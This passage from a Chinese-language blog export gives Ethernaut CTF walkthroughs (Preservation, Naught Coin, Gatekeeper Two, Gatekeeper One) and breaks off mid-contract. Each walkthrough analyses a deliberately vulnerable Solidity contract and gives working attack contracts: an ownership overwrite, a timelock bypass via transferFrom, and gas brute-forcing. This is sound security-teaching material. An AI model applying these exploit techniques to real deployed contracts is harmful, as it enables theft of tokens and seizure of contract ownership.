timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint _time) public &#123;</span><br><span class="line">    //形参_time没用到，只是为了函数选择器一致才这么设置的</span><br><span class="line">    //直接将owner设置为我们的钱包地址，没用到_time</span><br><span class="line">        owner = address(0xd3E65149C212902749D49011B6ab24bba30D97c6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，做题</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/16.Preservation/image-20221224171028921.png" alt="image-20221224171028921"></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/16.Preservation/image-20221224171046536.png" alt="image-20221224171046536"></p><p>再次调用</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/16.Preservation/image-20221224171053790.png" alt="image-20221224171053790"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/16.Preservation/image-20221224170655355.png" alt="image-20221224170655355"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.Naught Coin</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/15.Naught%20Coin/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/15.Naught%20Coin/</url>
      
        <content type="html"><![CDATA[<h1 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：将player（即我们的钱包用户）的token全部转出去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本道题是考察我们对ERC20标准的认识。</p><p>本题实现ERC20标准，发行了一些代币，这些代币全部给到了我们的钱包地址，实现了一个方法<code>transfer(address,_to, uint256 _value)</code>，然后修饰器lockTokens限制了它：只能在10年之后才可以调用transfer方法转出去代币。当然我们不能等这么久，得想办法绕过去。</p><p>我们知道，ERC20标准有两个转账函数：transfer和transferFrom。本题中只override和限制了transfer，那么我们是可以通过transferFrom来进行转账的。对于transferFrom：转账之前需要进行授权，授权给一个代理人，允许他转出我们一个金额，当然这个代理人可以是我们自己。</p><p>因此，我们只需要approve自己，然后自己再调用transferFrom函数即可转出代币</p><p>本题是只重写和限制了transfer而没有对transferFrom进行处理，因此可以这么解题</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，做题</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224163939803.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224163618322.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.Gatekeeper Two</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/14.Gatekeeper%20Two/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/14.Gatekeeper%20Two/</url>
      
        <content type="html"><![CDATA[<h1 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：修改entrant，即：成功调用<code>enter(bytes8 _gateKey)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本道题要我们成功调用<code>enter(bytes8 _gateKey)</code>，那么就需要通过三个修饰器<code>gateOne</code>，<code>gateTwo</code>和<code>gateThree(_gateKey)</code>的检验。</p><h3 id="gateOne"><a href="#gateOne" class="headerlink" title="gateOne"></a>gateOne</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里需要我们理解msg.sender和tx.origin的区别。意思是要求：我们不可以直接调用，需要写一个合约进行调用</p><p><img src="https://moe.photo/images/2022/12/24/-2022-12-24-145422.jpg" alt></p><h3 id="gateTwo"><a href="#gateTwo" class="headerlink" title="gateTwo"></a>gateTwo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第一个知识点：caller()是指消息的调用者，可以是合约也可以是用户。结合gateOne，在本题中就只能是合约了。</p><p>这个modifier的意思是<code>extcodesize(caller())</code>需要等于0，那么就要合约当中没有任何内容，代码量为0。但我们要写攻击合约，肯定要写内容的，那么这个时候，就必须要在构造器中写攻击代码。在构造器里面写，发起了攻击，并且也通过了gateTwo的检验</p><h3 id="gateThree-gateKey"><a href="#gateThree-gateKey" class="headerlink" title="gateThree(_gateKey)"></a>gateThree(_gateKey)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li><code>msg.sender</code>：我们的攻击合约地址</li><li><code>(abi.encodePacked(msg.sender))</code>：编码我们的攻击合约地址</li><li><code>(bytes8(keccak256(abi.encodePacked(msg.sender)))</code>：编码我们的攻击合约地址，并且取高8字节</li><li><code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>：编码我们的攻击合约地址，并且取高8字节，然后高位补0补齐至64位数。我们假设这个结果是X</li></ol><p><code>X ^ uint64(_gateKey)</code>的意思是：两个64位的数值进行异或。我们假设这个结果是Y</p><p><code>Y == type(uint64).max)</code>：意思是Y的值需要等于uint64类型的最大值，即：FFFFFFFFFFFFFFFF</p><p>那么就是说，我们传入的_gateKey经过那一串的异或处理之后，要变成最大值（全1），异或结果得到全1。因为<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>是不可控的，我们只可以输入<code>_gateKey</code>，那么输入的<code>_gateKey</code>就要和<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>每一位数字都相反，才可以异或得到全1。</p><p>要达到这个目的，我们的<code>_gateKey</code>应该是<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>每一位都取反的结果，这样<code>_gateKey</code>再和<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>异或就是全1。举个例子：110 ^ _gateKey，gateKey=&gt;110取反=&gt;001。然后110 ^ 001=111。</p><p>因为solidity没有取反操作，但异或一个全为1的数可以达到相同的结果。在本题就是异或0xFFFFFFFFFFFFFFFF</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0xc90c27F7431c86837933437ae4c94aA6f6B6591f);</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^  0xFFFFFFFFFFFFFFFF;</span><br><span class="line">        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取题目实例，部署之后，查看entrant：成功被修改</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224144251630.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224144212536.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.Gatekeeper One</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/13.Gatekeeper%20One/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/13.Gatekeeper%20One/</url>
      
        <content type="html"><![CDATA[<h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a><strong>Gatekeeper One</strong></h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：修改entrant，即：成功调用<code>enter(bytes8 _gateKey)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本道题要我们成功调用<code>enter(bytes8 _gateKey)</code>，那么就需要通过三个修饰器<code>gateOne</code>，<code>gateTwo</code>和<code>gateThree(_gateKey)</code>的检验。</p><h3 id="gateOne"><a href="#gateOne" class="headerlink" title="gateOne"></a>gateOne</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里需要我们理解msg.sender和tx.origin的区别。意思是要求：我们不可以直接调用，需要写一个合约进行调用</p><p><img src="https://moe.photo/images/2022/12/24/-2022-12-24-010131.jpg" alt></p><h3 id="gateTwo"><a href="#gateTwo" class="headerlink" title="gateTwo"></a>gateTwo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateTwo() &#123;</span><br><span class="line">   require(gasleft() % 8191 == 0);</span><br><span class="line">   _;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>gasleft()</code>：是solidity的内置方法，方法返回此次交易我们还剩余多少gas。returns (uint256)</p><p>意思是，当程序执行到<code>require(gasleft() % 8191 == 0)</code>这一步时，交易所剩的gas取模8191的值为0，那么我们有两个思路来通过这个修饰器：暴力尝试和通过debug来查看gas消耗情况</p><h4 id="暴力尝试"><a href="#暴力尝试" class="headerlink" title="暴力尝试"></a>暴力尝试</h4><p>gas的剩余量取模8191的结果为0，那么暴力尝试的可能性就只有8191种，那么我们可以做一个循环，从0gas开始到8191gas进行调用方法，总有一次可以通过此修饰器，很有意思的是，网络上有大佬优化了这个暴力尝试的过程（attack方法是网上大佬的思路，attack_是真正的暴力破解）</p><p>【网络版本】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 为什么这么写呢？因为有玩家通过测试，本关这里的gas大概在210次</span><br><span class="line">// 然后他取了一个缓冲值60上下浮动，即：210加减60=&gt;150~270</span><br><span class="line">// 那么，他就打算从gas=150开始循环</span><br><span class="line">// 最多到270次就收手，这就是120的由来：270-150=120</span><br><span class="line">for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>【未知情况，真正暴力破解版本】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">          // 乘3原因：气体最低限制21000，低于这个值就很可能call调用失败。因此*3就大于21000，你可以乘任何&gt;=3的值</span><br><span class="line">          // i从0开始，不断尝试，理论上最多有8191种可能，肯定能试出来。</span><br><span class="line">          // 一旦试出来，result返回true，就可以退出循环了</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="debug查看"><a href="#debug查看" class="headerlink" title="debug查看"></a>debug查看</h4><p>目的是通过<code>require(gasleft() % 8191 == 0);</code>的检验，那么我们可以debug到gasleft()操作码，它的操作码是GAS，GAS执行完之后剩余的gas就是 <code>X % 8191</code> 的值X。我们的需求就是X是8191的倍数。</p><p>solidity代码和交易中，执行同一个方法，操作码是不变的，那么我们代码执行到GAS操作码所消耗的gas就是定值。我们可以把这个定值找出来，然后加上8191的倍数，就可以通过此处的检验。</p><p>所以我们先设置一个较大的gas执行，看看执行到GAS操作码之后，消耗了多少gas</p><p>但是遇到了问题，我的remix页面debug不到GAS操作码。原因：remix需要Ethersccan测试网的API，且追踪一个已经验证的合约，才可以进入debug。如下图设置一下：</p><p><img src="https://moe.photo/images/2022/12/25/image-20221225003946338.png" alt></p><p>【1】gas设置为100000</p><p><img src="https://moe.photo/images/2022/12/25/UBQAND45K5X4O4AUX60.png" alt></p><p><img src="https://moe.photo/images/2022/12/25/2.png" alt></p><p>71874=8191*8+6346<br>100000-6346=93654</p><p><img src="https://moe.photo/images/2022/12/25/3.png" alt></p><p><img src="https://moe.photo/images/2022/12/25/4.png" alt></p><p>65627=8191*8+99<br>93654-99=93555</p><p><img src="https://moe.photo/images/2022/12/25/5.png" alt></p><p>65529=8191*8+1<br>93555-1=93554</p><p><img src="https://moe.photo/images/2022/12/25/6.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/25/image-20221225135209068.png" alt></p><p>奇怪的是：我的代码从始至终都没有变，gas设置为100000。然后交易的时候gas设置为100000=&gt;93654=&gt;93555=&gt;93544。最终在93544成功。我保证我每一次计算都是正确的，然而每次发送交易的时候，执行到GAS操作码的时候remain gas的值都会变化。只有93555=&gt;93544的时候固定消耗gas才保持不变。<br>因此，我认为，就算同一个代码，发送交易的时候设置的gas不一致，那么程序执行的时候操作码消耗的gas也会产生变化？只有一些特定的不同gas值才会消耗相同的gas。即：gas上限的设置也会影响操作码的gas消耗，只是有些时候比较幸运不会产生变化【就比如本题的93555和93554固定消耗gas相同，而100000、93654、93555他们三者不同的gas上限设置也会导致固定消耗不同】<br>因此，我推断：交易的时候gas上限的设置也会影响实际gas的消耗情况，只是这个情况比较特殊，而有些gas就不会影响gas消耗。而这个特殊的情况就是我们本题需要找的值</p><p>而且，在call语句设置的gas似乎是没用的，程序只看交易的时候设置的gas上限。本题我的代码的call的gas一直是100000，然后交易的时候，gas交易上限不断改变，到了GAS操作码的时候remain gas也会产生变化</p><blockquote><p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><p>录制了一个debug解题的<a href="https://www.bilibili.com/video/BV1214y1P7Gi/?spm_id_from=333.999.0.0&amp;vd_source=0cc0401ee122346d6680e90658b0ed1a">视频</a>，里面阐述了做题过程和疑问</p></blockquote><h3 id="gateThree-gateKey"><a href="#gateThree-gateKey" class="headerlink" title="gateThree(_gateKey)"></a>gateThree(_gateKey)</h3><p>想要通过这个修饰器检验，我们得先了解一下solidity中类型截断、保留、补位的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>空讲很难理解，用一个例子来解释吧。传入的是bytes8，那么就假如传入的是：0x11112222aaaabbbb</p><ol><li>第一个require：<code>uint32(uint64(_gateKey))</code>从低位截取，变成0xaaaabbbb。<code>uint16(uint64(_gateKey))</code>从低位截取，变成0xbbbb。根据solidity的规则，uint32和uint16在比较的时候，较小的类型uint16会在高位补0至位数和较大类型uint32一致，即：0x0000bbbb和0xaaaabbbb比较。因此，我们的参数<code>_gateKey</code>得是一个xxxxxxxx0000xxxx类型的数值。</li><li>第二个require：<code>uint64(_gateKey)</code>是保留所有位，而<code>uint32(uint64(_gateKey))</code>保留低32位。两者低32位是一模一样的，要通过require，则需要高32位任意一位不一致即可，因为<code>uint32(uint64(_gateKey))</code>高32位全部为0，那么我们传入的参数高32位至少需要一位数不为0。因此，我们的参数<code>_gateKey</code>可以是一个FFFFFFFF0000xxxx类型的数值。</li><li>第三个require：目前我们确定参数<code>_gateKey</code>可以是一个FFFFFFFF0000xxxx类型的数值。那么<code>uint32(uint64(_gateKey))</code>之后的结果就是0000xxxx。<code>uint16(uint160(tx.origin))</code>是对钱包地址进行操作，数值类型从低位开始截取，即<code>uint16(uint160(tx.origin))</code>的结果是我们钱包地址的后16位，就是后面4个数，对于我来说为97c6。那么这个<code>_gateKey</code>就确定下来了，可以为：FFFFFFFF000097c6。（前8个F是可变的，0000是雷打不动的，97c6根据自己的钱包而定）</li></ol><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  GatekeeperOne gatekeeperOne = GatekeeperOne(0x133636510C89C2075813d4Aba991A44B5A85aA97);</span><br><span class="line"></span><br><span class="line">  function attack() public &#123;</span><br><span class="line">    bytes8 key = 0xFFFFFFFF000097c6;</span><br><span class="line">      // 网络版本</span><br><span class="line">      // 为什么这么写呢？因为有玩家通过测试，本关这里的gas的i大概在210次</span><br><span class="line">      // 然后他取了一个缓冲值60上下浮动，即：210加减60=&gt;150~270</span><br><span class="line">      // 那么，他就打算从gas=150开始循环</span><br><span class="line">      // 最多到270次就收手，这就是120的由来：270-150=120</span><br><span class="line">      for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack_() public &#123;</span><br><span class="line">    bytes8 key = 0xFFFFFFFF000097c6;</span><br><span class="line">      //未知版本</span><br><span class="line">      for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">          // 乘3原因：气体最低21000，低于这个值就很可能call调用失败。因此*3就大于21000，你可以乘任何&gt;=3的值</span><br><span class="line">          // i从0开始，不断尝试，理论上最多有8191种可能，肯定能试出来。</span><br><span class="line">          // 一旦试出来，result返回true，就可以退出循环了</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          